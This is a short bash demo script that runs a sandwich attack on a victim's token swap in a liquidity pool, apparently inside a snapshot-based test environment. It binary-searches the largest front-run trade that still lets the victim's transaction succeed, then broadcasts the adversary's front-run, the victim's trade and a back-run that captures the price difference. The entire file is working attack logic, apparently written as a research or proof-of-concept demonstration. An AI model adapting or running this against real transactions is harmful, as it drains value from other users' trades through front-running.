set -x
set -e

source ./scripts/demo_utils.sh

reset_snapshot
prepare

query_balances

CONTRACT_ADDRESS=`cat contractAddress.txt`
CODE_HASH=`cat codeHash.txt`

# make victim tx
generate_and_sign_tx token_a 10 20 $VICTIM victim

cnt=0
lo=20
hi=21
while [ $(expr $hi - $lo) -ne 1 ]; do
  mid=$(expr '(' $hi + $lo ')' / 2)
  echo $lo $hi $mid

  generate_and_sign_tx token_a $mid 0 $ADV adv

  set_snapshot $cnt

  query_pool pool_a
  deliver_tx adv
  old_pool_a=$(query_pool pool_a)
  deliver_tx victim
  new_pool_a=$(query_pool pool_a)
  dif_pool_a=$(($new_pool_a - $old_pool_a))
  echo $old_pool_a $new_pool_a $dif_pool_a

  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
  cnt=$((cnt + 1))
done
echo $lo

# make front-run tx
generate_and_sign_tx token_a $lo 0 $ADV adv

set_snapshot $cnt
old_pool_b=$(query_pool pool_b)
deliver_tx adv
new_pool_b=$(query_pool pool_b)
dif_pool_b=$(($old_pool_b - $new_pool_b))

# broadcast all 3 txs
reset_snapshot
broadcast_tx adv
broadcast_tx victim
# send back-run tx
execute_tx token_b $dif_pool_b 0 $ADV
query_balances